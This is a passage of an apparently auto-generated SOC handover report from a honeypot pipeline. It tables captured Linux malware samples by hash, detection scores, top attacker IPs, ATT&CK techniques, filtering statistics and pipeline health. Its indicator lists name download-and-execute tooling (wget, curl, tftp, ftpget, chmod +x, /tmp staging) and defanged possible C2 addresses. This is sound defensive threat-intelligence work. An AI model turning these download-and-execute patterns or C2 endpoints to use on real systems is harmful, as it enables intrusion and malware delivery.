| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/73** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **29/73** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 42/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 51/100 | 🟡 MEDIUM | **28/73** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/73** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 42/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `5f160094d291b41abe2e65a17c1b1c8a4aec041bf63c72cf01494b2ff37e20c9` | ELF Binary (Linux executable) (ARM 32-bit) | `5f160094d291b41a...` | 61/100 | 🟡 MEDIUM | **29/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/73** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 64/100 | 🟡 MEDIUM | **12/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 61/100 | 🟡 MEDIUM | **27/73** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 85/100 | 🔴 HIGH | **39/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `84fac1d9c9d83182fa6428365907f7fbeb4c621eb7eb2b2a0140fdcd245b20e9` | ELF Binary (Linux executable) (x86-64 64-bit) | `84fac1d9c9d83182...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `85338e737e8b8c9ff9742ebc5bb0b73d91d441774161ad936f14910259d985ba` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `85338e737e8b8c9f...` | 60/100 | 🟡 MEDIUM | **26/73** 🔴 |
| `85a17fe8e290a224a717445d0f5e819283567101a92945ea10069946dc7e19d8` | Shell Script | `85a17fe8e290a224...` | 56/100 | 🟡 MEDIUM | **16/74** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **44/74** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `8ee57538c54d91114aaf824330878c6bca5e905f32a7d4ee7517e1efd364e19c` | Unknown binary | `8ee57538c54d9111...` | 56/100 | 🟡 MEDIUM | **40/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `129.153.145[.]135` | US | Oracle Corporation | **100** ⚠️ | 8 |
| `45.198.224[.]120` | NL | VPSVAULT.HOST LTD | **100** ⚠️ | 4 |
| `74.208.177[.]56` | US | IONOS Inc. | **100** ⚠️ | 50 |
| `117.247.239[.]202` | IN | Broadband Multiplay Project, O/o DGM BB, NOC BSNL Bangalore | **100** ⚠️ | 50 |
| `113.158.205[.]225` | JP | DION (KDDI CORPORATION) | **100** ⚠️ | 50 |
| `183.239.20[.]236` | CN | China Mobile Communications Corporation | **100** ⚠️ | 36 |
| `27.128.162[.]146` | CN | CHINANET hebei province network | **100** ⚠️ | 50 |
| `52.142.44[.]95` | US | Microsoft Corporation | **100** ⚠️ | 2 |
| `14.194.128[.]158` | IN | Tata Teleservices Limited -GSM Division | **100** ⚠️ | 50 |
| `46.201.247[.]21` | UA | JSC Ukrtelecom | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 170 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 159 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 94 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 94 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 94 |

---

## 🔕 False Positive Summary (13 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 10 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 345 cases |
| Tool 34  | Credential Extractor        | ✅ 189 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 9 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 68 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 13 filtered (3.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 50 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 37 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 159 priority case(s) shown individually · 14 recon entry/entries in table (6 group(s) consolidating 165 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-10T14:36:31Z_
